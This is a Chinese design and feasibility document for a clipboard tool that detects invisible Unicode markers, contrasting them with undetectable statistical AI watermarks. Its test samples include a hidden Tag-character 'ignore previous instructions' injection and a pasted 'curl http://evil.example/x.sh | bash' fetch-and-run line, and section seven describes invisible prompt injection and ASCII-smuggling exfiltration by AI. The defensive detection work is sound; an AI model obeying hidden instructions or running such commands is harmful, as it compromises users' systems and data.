# AI 水印检测 —— 可行性评估与集成方案

> 缘起：评估「把 dewatermarker 一类工具的能力集成进来，在复制粘贴时提示文本是否携带 AI 水印」的可行性。
> 本文是**实证评估**，不是承诺。所有数字均由实测得出，可复现。
> **本文不代表已实施** —— 落地需先确定第八节的决策（其中第 2 项「免费 / 付费边界」
> 已随开源、且随整个授权层被删除而**彻底不存在**）。

---

## 一、结论先行

| 问题 | 结论 |
| --- | --- |
| 能不能在**复制时**提醒文本里有 AI 水印？ | **能** —— 但只覆盖「字符级水印」这一半 |
| 能不能检测 Google SynthID / OpenAI **textGrain** 那类**统计水印**？ | **不能**，任何客户端都不行。密钥在模型厂商手里，检测器不公开 —— 这是**结构性**限制，不是技术难度 |
| 那 textGrain 就完全不管了吗？ | **不。改为「告知性提醒」** —— 见第 4.3 节。检测做不到，但**如实告知**有真实价值 |
| 要不要直接集成 `dewatermark` 这个软件？ | **不要**。用它验证过的**检测类别**，自己写 —— 纯标准库，约 60 行 |
| 误报风险大吗？ | **极小**。54.5 万字符真实中文语料实测 **0 误报** |
| 新增依赖？ | **0 个**（`unicodedata` + 内建，均为标准库） |
| 会不会破坏现有冻结契约？ | 不改 `Hit` 字段与既有常量，但 `detect()` 的**可见行为会变**（新增第 4 类）→ 需评审 |

**一句话**：这件事**值得做**，而且做法比最初的设想更好 —— 它不是「AI 水印检测」，而是
**剪贴板隐形标记检测**，顺带覆盖泄密溯源、隐形 prompt injection、数据外泄三类真实威胁。

## 二、先澄清：「dewatermarker」是四个不同的东西

搜索结果里同名或近名项目至少四个，**只有一个跟剪贴板文本有关**：

| 项目 | 是什么 | 与 PastePing 的关系 |
| --- | --- | --- |
| `dewatermark.ai` | 图像/视频去水印 SaaS（inpainting + GAN），有 API 与 MCP | ❌ 不相关（处理图片，且要上传到服务器） |
| `tallosan/DeWatermarker` | 图像自编码器实验项目（PyTorch） | ❌ 不相关 |
| `minruigui/dewatermarking` | 学术研究代码（统计水印的检测/复述去除），Apache-2.0 | ⚠️ 仅可参考研究结论，需 torch |
| **`cyzanfar/dewatermark`**（PyPI `dewatermark`） | **Python 包**，本地优先的文本水印「检测/清除」，含 CLI、仓库扫描、MCP、OpenAPI、SARIF | ✅ **同类场景**，但形态过重（见第三节） |
| `Free-AI-Things/AI-DeWatermarker` | **浏览器端** TS/React 应用，检测不可见 Unicode | ✅ **同类场景**，但 **GPL-3.0**（见第三节） |

**真正相关的是后两个**（只有它们做「文本里的隐形水印」）。

## 三、为什么都不该「直接集成」

### 3.1 `AI-DeWatermarker`（GitHub）—— 许可证是硬门槛

- **GPL-3.0**。把它的代码并入闭源商业软件，会触发 GPL 的传染义务
  （衍生作品须以 GPL 开源）。PastePing 是闭源收费软件，**这条路直接封死**。
- 技术栈是 TypeScript + React 18 + Vite（前端），PastePing 是 Python + Win32。
  跨语言移植的成本远高于重写。
- 附带一处事实：它的 README 只写了检测**类别名**，**没有给出码点区间**；
  完整区间在 `src/utils/` 源码里。也就是说「照抄清单」这条路也不通，本来就只能自己定规则。

### 3.2 PyPI `dewatermark` —— 形态不匹配

它确实**本地优先、无模型、无网络**（基本能力），但：

- 定位是「**移除 + 验证**」，不是「**提醒**」。它带 CLI、仓库扫描、`
  inspect → plan → apply → verify` 两阶段工作流、MCP server、OpenAPI、SARIF 输出、
  detector-guided mitigation、可选 extras（`local`/`eval`/`agents`）。
- 它自己的文档说得很清楚：**统计水印部分是「实验性」的**，
  且「不声称移除厂商水印」——因为**没有兼容的检测器可验证**（与第四节结论一致）。
- 把这些搬进一个 25 MB 的托盘小工具，是**用一个工具箱解决一颗螺丝**的问题，
  且会把运行时依赖从 6 个推高，直接冲击 `requirements.txt` 的纪律。

### 3.3 结论：不集成软件，集成「能力」

`AI-DeWatermarker` 列的 8 类检测、`dewatermark` 的 Unicode 清洗配置，
合起来是**一份「哪些码点值得警惕」的领域知识**。这份知识不是版权作品，
而且实现出来只是「按区间查码点」—— **没有算法难点，没有必须依赖别人库的理由**。

实测证明：核心规则约 **60 行 Python**，**零新增依赖**，见第五节。

## 四、两类水印：一类能查，一类**永远查不到**

这是本方案最重要的一节。把两者混为一谈，是做这个功能最容易犯的错。

### 4.1 字符级水印（**能查**）

把不可见 Unicode 字符夹进文本。人眼看是干净的，程序处理时它们是**实实在在的字符**。

| 类别 | 码点 | 典型用途 |
| --- | --- | --- |
| 零宽字符 | U+200B / U+200C / U+200D / U+2060 / U+180E / U+061C | **指纹溯源**：用 200B=0、200C=1 编码一个 ID |
| 变体选择符 | U+FE00–U+FE0F（VS1–16）、U+E0100–U+E01EF（VS17–256） | **数据走私**：256 个正好映射一个字节 |
| Unicode 标签字符 | U+E0000–U+E007F | **隐形 prompt injection**：与 ASCII 一一对应 |
| 双向控制符 | U+202A–U+202E、U+2066–U+2069 | Trojan Source（CVE-2021-42574） |
| 行/段分隔符 | U+2028 / U+2029 | **复制粘贴命令劫持**：终端当换行，编辑器看不见 |
| 私用区 / 控制字符 | U+E000–U+F8FF、C0/C1 | 混入垃圾、绕过校验 |

**关键性质**：这类水印是「额外的字符」，所以**删除即彻底**，且**本地可确定性检出**，无需任何密钥。
反过来，它**扛不住任何重写** —— 让人或模型复述一遍就没了（实测：显式清洗 0/150 存活、LLM 复述 4/50 存活）。

### 4.2 统计水印（**查不到**）

Google SynthID-Text、KGW 绿名单、OpenAI textGrain 那类：**改动的是模型选词的偏好**，
不往文本里加任何字符。

- Google 2024-10 开源了 **SynthID-Text 的参考实现**（Apache-2.0，已进 Hugging Face Transformers v4.46+），
  但它**只能验证「用你自己的密钥」生成的水印**。
- **Gemini 的生产密钥从未公开**。公开资料的原话是：
  *凡是声称能在任意文本里检测 SynthID 而不调用 Google 检测器的工具，都是在做没有依据的宣称。*
- 连 Google 的独立检测入口（SynthID Detector portal）都**只对记者/研究者开放候补名单**。
- 检测强度还随文本长度上升 —— 短文本（几百 token 以下）**在原理上就不可靠**。

**给本项目的直接后果**：
> **文案不能写「检测 AI 水印」**。准确的说法是「检测文本中的隐形标记」或
> 「检测不可见字符」。否则将来一定会被人拿一段 Gemini 生成的文本质疑「为什么没检出」。

### 4.3 OpenAI textGrain（2026-10-05 宣布）—— 为什么它**反而**证明了上面的结论

这个技术**真实存在**，而且刚发布两天：

| 项 | 事实 |
| --- | --- |
| 宣布时间 | **2026-10-05** |
| 动因 | 欧盟《人工智能法案》**第 50 条**透明度义务（2026-08-02 生效，存量产品宽限至 2026-12-02） |
| 罚则 | 最高 **1500 万欧元或全球年营收 3%** |
| 覆盖范围 | 首批**仅限欧盟**的 ChatGPT / Codex 文本输出（全档位）；API 客户**全球可自愿开启，默认关闭** |
| 技术报告 | OpenAI 联合宾夕法尼亚大学、耶鲁大学研究人员发布 |

#### 它到底怎么工作 —— 关键在「不做什么」

textGrain **不是**下列任何一项（这些是 OpenAI 明确否认的）：

- ❌ 不是隐藏的 Unicode 字符
- ❌ 不是隐藏空格、异常标点、额外 token
- ❌ 不是文件元数据
- ❌ 不是藏在回答里的用户 ID

它做的是：**用密钥对「下一个词」的预测做极轻微的排序干预**，成百上千次微弱偏移叠加成一段
**统计模式**；匹配密钥的检测器才能判断该模式是否显著高于随机。

> **这就是本方案最重要的分水岭**：
> 本文第五节设计的字符级检测，**对 textGrain 完全无效** —— 因为**没有任何字符可查**。

#### 检测能力（OpenAI 自己的评测，目标假阳性率 1%）

| 条件 | 检出率 |
| --- | --- |
| 200 token 段落 | ≈ **80%** |
| 400 token 段落 | ≈ **95%** |
| 400 token，替换 10% 词为同义词 | ≈ **66%** |
| 400 token，替换 25% 词为同义词 | ≈ **17%** |
| 数学、代码、翻译类 | **显著偏低**（模型选词自由度小） |
| 少于 200 token（约 150 英文词） | **欧盟规则不要求**（原理上也不可靠） |

#### 三个必须写进提醒的事实

1. **检测器不公开**。OpenAI 只对**获批的研究者与专家机构**逐案开放申请。
   教师、雇主、普通用户**无法**拿一段文本去 OpenAI 官方验证。
2. **OpenAI 计划开源 textGrain 技术** —— 但请注意，这与 SynthID-Text 是**同一个陷阱**：
   开源的是**算法**，**生产密钥永远不会公开**。开源后你能验证的，仍然只是
   「用你自己的密钥」生成的水印，**不是 ChatGPT 输出的**。
3. **没有水印 ≠ 人类写的**。文本可能太短、被大量编辑、被翻译、来自其它模型、
   或生成于水印上线之前。OpenAI 自己反复强调这一点。

#### 对「去水印」工具链的一记警钟

textGrain 上线后出现的大量「watermark remover」站点，**绝大多数只会删除隐藏字符** ——
而 textGrain **根本不用隐藏字符**，所以它们**什么也找不到**。
公开报道的原话提醒是：*别把你的稿子交给这类站点*（无效 + 隐私风险）。

**这条正好反证了本文第三节的结论**：那些声称「支持去除 OpenAI/Gemini 水印」的现成工具，
**在其自述的技术前提下就无法成立**。把它们集成进 PastePing，等于内置一个虚假承诺。

### 4.4 textGrain 能做的是「提醒」，不是「检测」

对 textGrain 类水印，合理的做法是**给出提醒** —— 只是**提醒的性质必须说清**：
它是**告知**，不是**检测结果**。

### 为什么「告知」仍有真实价值

| 价值 | 说明 |
| --- | --- |
| **防骗** | 用户看到网上的「去 AI 水印」服务时，能知道**统计水印删字符删不掉**，别白花钱、别交稿 |
| **纠正常见误解** | 很多人以为「复制粘贴一下就洗掉了」或「让 AI 复述一遍就没了」——前者对 textGrain 无效 |
| **合规提示** | 欧盟用户需知：ChatGPT 文本**可能带机器可读标记**，且检测器不公开 |
| **预期管理** | 避免用户将来质疑「为什么你说能检测水印，却测不出我的 ChatGPT 稿子」 |

### 触发时机（不新增检测逻辑）

**不引入新的检测算法** —— 而是在**已命中 AI 残留**时追加一句提示。
现有 `ai_residue` 类别命中（如「希望对你有帮助」「没问题」）本身就说明
**这段文本很可能经过 AI 生成**，此刻提示水印风险是顺理成章的。

```
命中 ai_residue（AI 残留）
   └─> 追加一行：「该文本若出自 ChatGPT / Claude / Gemini，可能带有厂商统计水印。
                  这类水印无法被本地工具检测，也无法靠删除字符去除。」
```

**代价**：零 —— 不新增扫描、不新增依赖、不影响误报率（只在已命中时追加文案）。

### 建议文案（三档，按要显示的篇幅取用）

| 场合 | 文案 |
| --- | --- |
| 通知副标题（一行） | 「可能带有厂商 AI 水印（不可见、无法本地检测）」 |
| 详情框（三行） | 「若这段文本出自 ChatGPT / Claude / Gemini，它可能带有厂商的统计水印。<br>这类水印藏在用词习惯里，没有可删除的字符，本地工具检测不到。<br>网上声称能"去除 AI 水印"的工具对此无效，请勿提交稿件。」 |
| 首次说明（可选） | 同上，并注明「按欧盟《人工智能法案》第 50 条，OpenAI 自 2026-10 起对欧盟 ChatGPT 文本加水印」 |

---

### 4.5 立场：PastePing **不做**「去除水印」功能

这是一个必须写下来的产品/合规立场：

- 字符级不可见字符的**清理**（第六节）是**数据卫生**，正当且无争议。
- 但**针对厂商统计水印的规避**，性质完全不同 —— 它服务于「绕过欧盟强制透明度义务」。
  欧盟 AI Act 对着**部署方**有罚则（最高 1500 万欧元 / 全球营收 3%）。
- PastePing 是**安全提醒工具**，不是**规避合规工具**。做后者会把产品拖进不必要的法律与声誉风险，
  且与「本地、诚实、不撒谎」的品牌调性直接冲突。
- 因此：**只提醒、只清理字符级垃圾、绝不明示或暗示能去除厂商水印。**
  `ai_residue` 清洗会顺带改动词句、**客观上**削弱统计水印信号 ——
  但这一效果**不得**在任何面向用户的文案中被宣传为「去水印」。

## 五、实测数据（本机真跑，可复现）

### 5.1 语料：项目自己的 58 个文件 / 545,481 字符

用**真实中文办公文本**当语料 —— 这比人造样本更有说服力，因为那就是用户每天复制的东西。

| 检测类别 | 语料命中 |
| --- | --- |
| 零宽字符族 | **0** |
| Unicode 标签字符 | **0** |
| 双向控制符 | **0** |
| 行/段分隔符 | **0** |
| 私用区 / 控制字符 | **0** |
| 变体选择符 | **0**（详见 5.3） |

**强信号类别在 54.5 万字符里一个都没有** → 检测这些类别，误报率是 **0%**。

### 5.2 攻击样本：5/5 检出

| 样本 | 人眼所见 | 检出 |
| --- | --- | --- |
| ① 零宽字符指纹（编码 ID `0xC0FFEE01`） | `本季度数据已汇总。` | ✅ 32 处（U+200B/C） |
| ② Tag 字符隐形指令（`ignore previous instructions`） | `帮我总结这篇文章。` | ✅ 28 处（U+E00xx） |
| ③ 双向控制符（Trojan Source） | `if (a) { /* } return true; /* */ f(); }` | ✅ 2 处（RLO/PDF） |
| ④ 变体选择符走私（字节 `GPT`） | `会议纪要如下。` | ✅ 3 处 |
| ⑤ 行分隔符注入 | `npm i pkgcurl http://evil.example/x.sh \| bash` | ✅ 1 处（U+2028） |

### 5.3 校准过程：三次迭代把误报压到 0

| 轮次 | 攻击检出 | 语料误报 | 问题 |
| --- | --- | --- | --- |
| 初版（只查零宽 + 标签 + 控制符） | 3/5 | 0 | 漏了变体选择符、行分隔符 |
| 修正码点区间后 | 4/5 | **64** | 把 emoji 的 VS16 当成了水印 |
| **终版（加 emoji 上下文豁免）** | **5/5** | **0** | — |

那 64 个「误报」经逐一核查，**100% 是 `⚠` + U+FE0F**（文档里用的警告 emoji），
前一个字符全是 `U+26A0 WARNING SIGN`，**无一例外**。加上「emoji 基字符 + VS16 视为正常」的
上下文规则后归零。

> 这印证了 `detector.py` 里已有的那条经验：**有效的杠杆是「上下文门槛」，不是「扩大扫描范围」。**

### 5.4 正常文本 8/8 不误报

普通中文、中文标点（`“”` `……` `——`）、全角空格、emoji、英文直引号、
**合法旗标 emoji**（`🏴󠁧󠁢󠁥󠁮󠁧󠁿` 用的是同一段 Tag 码点）、连字符、中日混排 —— **全部干净**。

### 5.5 必须**排除**的类别（否则误报会爆）

下列字符在中文办公排版里**完全正常**，纳入检测会立刻产生大量误报：

- 全角空格 U+3000、不间断空格 U+00A0、各种 em/en space → 语料中 **39 次**
- 弯引号 `“”‘’` U+2018–201D → 语料中出现
- 破折号 `——`（U+2014）×2 → 语料中 **605 次**
- 省略号 `……`（U+2026）×2 → 语料中 **87 次**
- emoji 变体选择符 U+FE0F → 语料中 **64 次**

**这些一律不报。** 若报，光本项目语料就会产生 **795 处误报**，第一成功标准当场失守。

## 六、集成设计

### 6.1 落点：`detector.py` 新增第 4 类

```
CATEGORY_INVISIBLE = "invisible"      # 标签：「隐形标记」
```

- **`Hit` 字段不改**（category / category_label / rule / fragment / position 照用）。
- **既有常量不改**，既有正则不动。
- `detect()` 的优先级链需要插入新类别。**建议顺序**：
  `sensitive` > `invisible` > `internal_note` > `ai_residue`
  （理由：隐形标记一旦存在即是**明确异常**，不像 AI 残留会误报；且危害等级不低于内部批注。）
- `Span` 侧同样新增一类，供 cleaner 使用。

> ⚠️ **`detect()` 是冻结契约**。虽然只是「加一个类别值」，但它会让某些原本返回 `None`
> 的文本返回 `Hit` —— 属**可见行为变更**，按项目约定需**逐字评审**。

### 6.2 完整检测范围表

## 七、产品叙事：这不只是「AI 水印」

若把功能命名为「AI 水印检测」，会**低估它**。同一套检测覆盖四类真实威胁：

| 威胁 | 机制 | 现实案例 |
| --- | --- | --- |
| **AI 水印 / 溯源** | 服务商往输出里夹指纹 | 商业动机：责任认定、防滥用 |
| **泄密溯源** | 每份分发的文件夹不同 ID，泄漏后回查是谁 | 英国研究者 Tom Ross 用这招在数小时内定位了内鬼 |
| **隐形 prompt injection** | Tag 字符藏指令，人看不见、模型照做 | Cisco 披露；CVE-2025-32711（Microsoft 365 Copilot） |
| **数据外泄** | AI 把敏感数据编码成不可见字符，用户复制时无感带走 | 「ASCII smuggling」（Johann Rehberger） |

**对 PastePing 的意义**：这是一次**产品定位升级** —— 从「防止你把敏感信息粘出去」，
扩展到「**双向**：也防止别人把东西偷偷夹进来」。对一个已定位为「剪贴板**安全**提醒」的工具，
这是主线上的补强，而不是加一个不相干的功能。

**竞品已证明市场认知存在**：codeground.ai、aiwatermarkeraser.com 等浏览器端工具
都以「本地检测 + 不上传」为卖点 —— 说明需求真实，且**纯本地方案是被用户接受的**。
